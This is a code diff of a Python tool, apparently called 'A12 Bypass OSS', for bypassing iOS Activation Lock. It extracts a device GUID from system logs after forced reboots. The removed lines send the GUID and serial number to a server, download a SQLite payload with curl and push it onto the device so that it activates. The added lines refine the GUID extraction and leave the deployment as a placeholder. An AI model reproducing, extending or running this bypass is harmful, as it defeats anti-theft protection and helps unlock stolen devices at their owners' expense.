@@ -4,8 +4,11 @@ import time
 import subprocess
 import re
 import shutil
-import sqlite3
+import tempfile
+import uuid
 import atexit
+import signal
+import threading
 
 class Style:
     RESET = '\033[0m'
@@ -20,63 +23,89 @@ class Style:
 
 class BypassAutomation:
     def __init__(self):
-        # --- CONFIGURATION ---
-        # REPLACE THIS URL with your actual domain after deploying the server
-        self.api_url = "https://your-domain.com/index.php"
-        
-        self.timeouts = {'asset_wait': 300, 'asset_delete_delay': 15, 'reboot_wait': 300, 'syslog_collect': 180}
-        self.mount_point = os.path.join(os.path.expanduser("~"), f".ifuse_mount_{os.getpid()}")
-        self.afc_mode = None
+        # --- Configuration ---
+        self.api_url = "http://localhost:8000/get.php" # As per gist
+        self.timeouts = {'reconnect_wait': 120, 'syslog_collect': 180, 'log_parse': 120, 'live_monitor': 45}
         self.device_info = {}
         self.guid = None
         atexit.register(self._cleanup)
 
     def log(self, msg, level='info'):
+        """Consistent logging throughout the script."""
         if level == 'info': print(f"{Style.GREEN}[✓]{Style.RESET} {msg}")
         elif level == 'error': print(f"{Style.RED}[✗]{Style.RESET} {msg}")
         elif level == 'warn': print(f"{Style.YELLOW}[⚠]{Style.RESET} {msg}")
         elif level == 'step':
-            print(f"\n{Style.BOLD}{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
-            print(f"{Style.BOLD}{Style.BLUE}▶{Style.RESET} {Style.BOLD}{msg}{Style.RESET}")
-            print(f"{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
+            print(f"\n{Style.BOLD}{Style.CYAN}" + "━" * 50 + f"{Style.RESET}")
+            print(f"{Style.BOLD}{Style.BLUE}▶ {msg}{Style.RESET}")
+            print(f"{Style.CYAN}" + "━" * 50 + f"{Style.RESET}")
         elif level == 'detail': print(f"{Style.DIM}  ╰─▶{Style.RESET} {msg}")
-        elif level == 'success': print(f"{Style.GREEN}{Style.BOLD}[✓ SUCCESS]{Style.RESET} {msg}")
+        elif level == 'success': print(f"\n{Style.GREEN}{Style.BOLD}[🎉 SUCCESS] {msg}{Style.RESET}\n")
 
     def _run_cmd(self, cmd, timeout=None):
+        """Executes a shell command and returns its output."""
         try:
-            res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
-            return res.returncode, res.stdout.strip(), res.stderr.strip()
-        except subprocess.TimeoutExpired: return 124, "", "Timeout"
-        except Exception as e: return 1, "", str(e)
+            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, errors='ignore')
+            stdout, stderr = process.communicate(timeout=timeout)
+            return process.returncode, stdout.strip(), stderr.strip()
+        except subprocess.TimeoutExpired:
+            process.kill()
+            process.communicate()  # Clean up
+            self.log(f"Command timed out after {timeout}s: {' '.join(cmd)}", "warn")
+            return 124, "", "Timeout"
+        except Exception as e:
+            self.log(f"Error running command {' '.join(cmd)}: {e}", "error")
+            return 1, "", str(e)
 
-    def verify_dependencies(self):
-        self.log("Verifying System Requirements...", "step")
-        if shutil.which("ifuse"): self.afc_mode = "ifuse"
-        else: self.afc_mode = "pymobiledevice3"
-        self.log(f"AFC Transfer Mode: {self.afc_mode}", "info")
+    def _get_udid(self):
+        """Retrieves the device's UDID."""
+        code, out, err = self._run_cmd(["ideviceinfo", "-k", "UniqueDeviceID"])
+        if code == 0 and out:
+            return out
+        self.log(f"Could not get device UDID. Error: {err}", "error")
+        return None
 
-    def mount_afc(self):
-        if self.afc_mode != "ifuse": return True
-        os.makedirs(self.mount_point, exist_ok=True)
-        code, out, _ = self._run_cmd(["mount"])
-        if self.mount_point in out: return True
-        for i in range(5):
-            if self._run_cmd(["ifuse", self.mount_point])[0] == 0: return True
-            time.sleep(2)
+    def is_device_connected(self):
+        """
+        Checks for device connectivity and service readiness.
+        This queries a specific service domain, which is a good indicator that the
+        device is fully booted and not just visible on the USB bus.
+        """
+        code, _, _ = self._run_cmd(["ideviceinfo", "-q", "com.apple.mobile.battery"])
+        return code == 0
+
+    def wait_for_reconnect(self, timeout):
+        """Waits for the device to reconnect after a reboot."""
+        self.log(f"Waiting for device to reconnect (up to {timeout}s)...", "step")
+        start_time = time.time()
+        
+        # Give the device a moment to fully disconnect before we start polling.
+        self.log("Waiting for device to disconnect first...", "detail")
+        time.sleep(5)
+        
+        self.log("Now actively polling for reconnection...", "detail")
+        while time.time() - start_time < timeout:
+            if self.is_device_connected():
+                self.log("Device reconnected! Waiting 5s for services to stabilize...", "info")
+                # Add a small buffer for all services to settle before proceeding.
+                time.sleep(5)
+                return True
+            time.sleep(5)
+            
+        self.log("Device did not reconnect in time.", "error")
         return False
 
-    def unmount_afc(self):
-        if self.afc_mode == "ifuse" and os.path.exists(self.mount_point):
-            self._run_cmd(["umount", self.mount_point])
-            try: os.rmdir(self.mount_point)
-            except: pass
+    def detect_device(self, quiet=False):
+        """Gathers and displays information about the connected device."""
+        if not quiet: self.log("Detecting Device...", "step")
+        if not self.is_device_connected():
+            if not quiet: self.log("No device found. Please connect your device.", "error")
+            return False
 
-    def detect_device(self):
-        self.log("Detecting Device...", "step")
-        code, out, _ = self._run_cmd(["ideviceinfo"])
-        if code != 0: 
-            self.log("No device found via USB", "error")
-            sys.exit(1)
+        code, out, err = self._run_cmd(["ideviceinfo"])
+        if code != 0:
+            if not quiet: self.log(f"Could not get device info. Error: {err}", "error")
+            return False
         
         info = {}
         for line in out.splitlines():
@@ -85,105 +114,240 @@ class BypassAutomation:
                 info[key.strip()] = val.strip()
         self.device_info = info
         
-        print(f"\n{Style.BOLD}Device: {info.get('ProductType','Unknown')} (iOS {info.get('ProductVersion','?')}){Style.RESET}")
-        print(f"UDID: {info.get('UniqueDeviceID','?')}")
-        
-        if info.get('ActivationState') == 'Activated':
-            print(f"{Style.YELLOW}Warning: Device already activated.{Style.RESET}")
+        if not quiet:
+            self.log("Device Detected:", "success")
+            print(f"  {Style.BOLD}Model:{Style.RESET}    {info.get('ProductType', 'N/A')}")
+            print(f"  {Style.BOLD}Version:{Style.RESET}  {info.get('ProductVersion', 'N/A')}")
+            print(f"  {Style.BOLD}Serial:{Style.RESET}   {info.get('SerialNumber', 'N/A')}")
+            print(f"  {Style.BOLD}UDID:{Style.RESET}     {info.get('UniqueDeviceID', 'N/A')}")
+            if info.get('ActivationState') == 'Activated':
+                print(f"\n{Style.YELLOW}Warning: Device is already activated.{Style.RESET}")
+        return True
 
-    def get_guid(self):
-        self.log("Extracting System Logs...", "step")
-        udid = self.device_info['UniqueDeviceID']
-        log_path = f"{udid}.logarchive"
-        if os.path.exists(log_path): shutil.rmtree(log_path)
+    def _try_live_syslog_monitoring(self):
+        """
+        Try to extract GUID using live syslog monitoring.
+        This was the successful method from extract_guid.py.
+        """
+        self.log("Method 1: Live syslog monitoring (proven method)...", "detail")
+        self.log(f"Monitoring device logs for {self.timeouts['live_monitor']} seconds...", "detail")
         
-        self._run_cmd(["pymobiledevice3", "syslog", "collect", log_path], timeout=180)
-        
-        if not os.path.exists(log_path):
-            self.log("Archive failed, trying live watch...", "warn")
-            _, out, _ = self._run_cmd(["pymobiledevice3", "syslog", "watch"], timeout=60)
-            logs = out
-        else:
-            tmp = "final.logarchive"
-            if os.path.exists(tmp): shutil.rmtree(tmp)
-            shutil.move(log_path, tmp)
-            _, logs, _ = self._run_cmd(["/usr/bin/log", "show", "--style", "syslog", "--archive", tmp])
-            shutil.rmtree(tmp)
+        try:
+            proc = subprocess.Popen(
+                ["pymobiledevice3", "syslog", "live"],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                errors='ignore'
+            )
+            
+            guid_pattern = re.compile(r'SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/')
+            
+            start_time = time.time()
+            found_guid = None
+            lines_checked = 0
+            relevant_lines = 0
+            
+            while time.time() - start_time < self.timeouts['live_monitor']:
+                try:
+                    line = proc.stdout.readline()
+                    if not line:
+                        time.sleep(0.1)
+                        continue
+                    
+                    lines_checked += 1
+                    
+                    if "BLDatabaseManager" in line or "SystemGroup" in line:
+                        relevant_lines += 1
+                        match = guid_pattern.search(line)
+                        if match:
+                            found_guid = match.group(1).upper()
+                            self.log(f"GUID found in live logs: {found_guid}", "info")
+                            proc.terminate()
+                            proc.wait(timeout=2)
+                            return found_guid
+                except:
+                    continue
+            
+            proc.terminate()
+            try:
+                proc.wait(timeout=2)
+            except:
+                proc.kill()
+            
+            self.log(f"Live monitoring: checked {lines_checked} lines, found {relevant_lines} relevant lines, no GUID", "detail")
+            return None
+            
+        except Exception as e:
+            self.log(f"Live syslog monitoring failed: {e}", "warn")
+            return None
 
+    def _get_guid_from_logs(self):
+        """
+        The core GUID extraction logic. This function tries multiple methods:
+        1. Live syslog monitoring (the proven successful method)
+        2. Archived log collection and parsing
+        """
+        udid = self.device_info.get('UniqueDeviceID')
+        if not udid:
+            self.log("Cannot extract GUID without a UDID.", "error")
+            return None
+
+        # Method 1: Try live syslog monitoring first (this worked in extract_guid.py)
+        found_guid = self._try_live_syslog_monitoring()
+        if found_guid:
+            return found_guid
+        
+        self.log("Live monitoring didn't find GUID, trying archive collection...", "warn")
+        
+        # Method 2: Try archive collection (original method)
+        temp_log_dir = tempfile.mkdtemp(prefix="ios_logs_")
+        log_archive_path = os.path.join(temp_log_dir, f"{udid}.logarchive")
+        
+        self.log("Collecting system logs archive (this can take up to 3 minutes)...", "detail")
+        code, out, err = self._run_cmd(
+            ["pymobiledevice3", "syslog", "collect", log_archive_path],
+            timeout=self.timeouts['syslog_collect']
+        )
+        
+        if code != 0 and code != 124:
+             self.log(f"Syslog collection failed. Stderr: {err}", "warn")
+
+        if not os.path.exists(log_archive_path):
+            self.log("Syslog archive was not created.", "error")
+            shutil.rmtree(temp_log_dir, ignore_errors=True)
+            return None
+
+        self.log("Syslog collected. Parsing with `log show`...", "detail")
+        
+        # Try different log show methods with proper Python timeout
+        logs = None
+        parse_methods = [
+            {
+                'name': 'Log show last 30 minutes',
+                'cmd': ["/usr/bin/log", "show", "--last", "30m", "--archive", log_archive_path],
+                'timeout': 60
+            },
+            {
+                'name': 'Log show with info filter',
+                'cmd': ["/usr/bin/log", "show", "--info", "--archive", log_archive_path],
+                'timeout': 90
+            },
+            {
+                'name': 'Standard log show with syslog style',
+                'cmd': ["/usr/bin/log", "show", "--style", "syslog", "--archive", log_archive_path],
+                'timeout': 120
+            },
+        ]
+        
+        for i, method in enumerate(parse_methods):
+            self.log(f"Attempting: {method['name']}...", "detail")
+            
+            parse_code, stdout, parse_err = self._run_cmd(method['cmd'], timeout=method['timeout'])
+            
+            if parse_code == 0 and stdout:
+                logs = stdout
+                self.log(f"Successfully parsed logs with: {method['name']}", "info")
+                self.log(f"Retrieved {len(stdout.splitlines())} lines of logs", "detail")
+                break
+            else:
+                if parse_code == 124:
+                    self.log(f"Method timed out, trying next approach...", "warn")
+                else:
+                    self.log(f"Method failed (code {parse_code})", "warn")
+
+        if not logs:
+            self.log("All log parsing methods failed.", "error")
+            shutil.rmtree(temp_log_dir, ignore_errors=True)
+            return None
+
+        # Search for GUID pattern
         guid_pattern = re.compile(r'SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/')
+        
+        self.log("Searching for GUID pattern in parsed logs...", "detail")
+        
+        bldatabase_mentions = 0
+        systemgroup_mentions = 0
+        guid_candidates = set()
+        
         for line in logs.splitlines():
             if "BLDatabaseManager" in line:
+                bldatabase_mentions += 1
                 match = guid_pattern.search(line)
-                if match: return match.group(1).upper()
+                if match:
+                    guid_candidates.add(match.group(1).upper())
+            
+            if "SystemGroup" in line:
+                systemgroup_mentions += 1
+                match = guid_pattern.search(line)
+                if match:
+                    guid_candidates.add(match.group(1).upper())
+        
+        self.log(f"Log analysis: {len(logs.splitlines())} lines, {bldatabase_mentions} BLDatabaseManager mentions, {systemgroup_mentions} SystemGroup mentions", "detail")
+        
+        if guid_candidates:
+            found_guid = list(guid_candidates)[0]
+            self.log(f"GUID found: {found_guid} (found {len(guid_candidates)} total candidates)", "info")
+            shutil.rmtree(temp_log_dir, ignore_errors=True)
+            return found_guid
+        
+        self.log("GUID pattern not found in archived logs.", "warn")
+        shutil.rmtree(temp_log_dir, ignore_errors=True)
         return None
 
     def run(self):
+        """The main orchestration workflow."""
         os.system('clear')
-        print(f"{Style.BOLD}{Style.MAGENTA}iOS Activation Tool - Professional Edition{Style.RESET}\n")
-        
-        self.verify_dependencies()
-        self.detect_device()
-        
-        input(f"{Style.YELLOW}Press Enter to start...{Style.RESET}")
-        
-        # 1. Reboot
-        self.log("Rebooting device...", "step")
-        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
-        time.sleep(30)
-        
-        # 2. Get GUID
-        self.guid = self.get_guid()
+        print(f"{Style.BOLD}{Style.MAGENTA}A12 Bypass OSS - GUID Extraction Tool{Style.RESET}\n")
+
+        if not self.detect_device():
+            sys.exit(1)
+
+        input(f"{Style.YELLOW}Press Enter to begin the GUID extraction process...{Style.RESET}\nMake sure the device is on the Activation Lock screen with Wi-Fi connected.")
+
+        max_attempts = 3
+        for attempt in range(max_attempts):
+            self.log(f"GUID Extraction Attempt {attempt + 1} of {max_attempts}", "step")
+
+            self.log("Rebooting device to trigger services...", "detail")
+            self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
+            
+            if not self.wait_for_reconnect(self.timeouts['reconnect_wait']):
+                self.log(f"Attempt {attempt + 1} failed: Device did not reconnect.", "warn")
+                if attempt < max_attempts - 1:
+                    time.sleep(10)
+                continue
+
+            # Re-detect device to ensure info is fresh after reboot
+            self.detect_device(quiet=True)
+            
+            found_guid = self._get_guid_from_logs()
+            if found_guid:
+                self.guid = found_guid
+                self.log(f"GUID Extracted Successfully: {self.guid}", "success")
+                break
+            
+            if attempt < max_attempts - 1:
+                self.log(f"Attempt {attempt+1} failed. Will wait and retry.", "warn")
+                time.sleep(20)
+
         if not self.guid:
-            self.log("Could not find GUID in logs.", "error")
+            self.log("PROCESS FAILED: Could not find GUID after multiple attempts.", "error")
+            print("Please try running the tool again. Ensure the device is properly connected and on the Hello screen.")
             sys.exit(1)
-        self.log(f"GUID: {self.guid}", "success")
-        
-        # 3. API Call
-        self.log("Requesting Payload...", "step")
-        params = f"prd={self.device_info['ProductType']}&guid={self.guid}&sn={self.device_info['SerialNumber']}"
-        url = f"{self.api_url}?{params}"
-        
-        _, out, _ = self._run_cmd(["curl", "-s", url])
-        if not out.startswith("http"):
-            self.log(f"Server Error: {out}", "error")
-            sys.exit(1)
-            
-        # 4. Download & Deploy
-        download_url = out.strip()
-        local_db = "downloads.28.sqlitedb"
-        if os.path.exists(local_db): os.remove(local_db)
-        
-        self._run_cmd(["curl", "-L", "-o", local_db, download_url])
-        
-        conn = sqlite3.connect(local_db)
-        try:
-            res = conn.execute("SELECT count(*) FROM sqlite_master WHERE type='table' AND name='asset'")
-            if res.fetchone()[0] == 0: raise Exception("Invalid DB")
-        except:
-            self.log("Invalid payload received.", "error")
-            sys.exit(1)
-        conn.close()
-        
-        # 5. Upload
-        self.log("Uploading...", "step")
-        target = "/Downloads/downloads.28.sqlitedb"
-        
-        if self.afc_mode == "ifuse":
-            self.mount_afc()
-            fpath = self.mount_point + target
-            if os.path.exists(fpath): os.remove(fpath)
-            shutil.copy(local_db, fpath)
-        else:
-            self._run_cmd(["pymobiledevice3", "afc", "rm", target])
-            self._run_cmd(["pymobiledevice3", "afc", "push", local_db, target])
-            
-        self.log("Payload Deployed. Rebooting...", "success")
-        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
-        
-        print(f"\n{Style.GREEN}Process Complete. Device should activate after reboot.{Style.RESET}")
-        self._cleanup()
 
-    def _cleanup(self): self.unmount_afc()
+        # --- Placeholder for rest of the activation process ---
+        self.log("Proceeding to activation payload generation...", "step")
+        print(f"\n{Style.CYAN}The tool would now use this GUID to contact the server at:{Style.RESET}")
+        print(f"{self.api_url}?prd={self.device_info['ProductType']}&guid={self.guid}&sn={self.device_info['SerialNumber']}")
+        print(f"\n{Style.GREEN}This completes the GUID extraction part of the task.{Style.RESET}")
 
-if __name__ == "__main__":
+    def _cleanup(self):
+        """Cleans up any temporary files or mounts."""
+        pass
+
+if __name__ == '__main__':
+    if os.geteuid() != 0:
+        print(f"{Style.RED}[error]{Style.RESET} This script requires sudo. Please run with 'sudo python3 {sys.argv[0]}'")
+        sys.exit(1)
     BypassAutomation().run()
